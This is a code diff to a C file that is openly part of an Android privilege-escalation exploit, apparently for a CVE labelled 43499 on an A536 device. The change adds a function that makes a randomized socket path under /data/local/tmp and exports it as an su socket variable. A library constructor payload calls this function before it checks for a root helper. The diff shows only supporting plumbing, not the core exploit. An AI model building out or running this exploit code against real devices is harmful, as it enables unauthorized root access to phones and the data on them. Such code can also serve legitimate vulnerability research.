@@ -6,9 +6,28 @@
 #include <string.h>
 #include <sys/types.h>
 #include <sys/wait.h>
+#include <time.h>
 #include <unistd.h>
 
+#ifndef SU_SOCKET_ENV
+#define SU_SOCKET_ENV "CVE43499_SU_SOCKET"
+#endif
+
 _Noreturn void a536_exploit(void);
+
+static void setup_su_socket(void) {
+  static unsigned counter;
+  struct timespec timestamp;
+  char path[108];
+  unsigned nonce;
+
+  if (clock_gettime(CLOCK_MONOTONIC, &timestamp))
+    return;
+  nonce = ((unsigned)getpid() * 2654435761u) ^ (unsigned)timestamp.tv_sec ^
+          (unsigned)timestamp.tv_nsec ^ counter++;
+  snprintf(path, sizeof(path), "/data/local/tmp/rmg-%08x.sock", nonce);
+  setenv(SU_SOCKET_ENV, path, 1);
+}
 
 static int root_helper_id(const char *helper, char *proof, size_t proof_size) {
   int pair[2];
@@ -89,6 +108,7 @@ __attribute__((constructor)) static void a536_payload(void) {
   started = 1;
   setvbuf(stdout, NULL, _IONBF, 0);
   setvbuf(stderr, NULL, _IONBF, 0);
+  setup_su_socket();
   root_helper = getenv("CVE43499_ROOT_HELPER");
   if (!root_helper || !*root_helper || access(root_helper, X_OK)) {
     fprintf(stderr, "A536_APP_FAIL root helper errno=%d %s\n", errno,
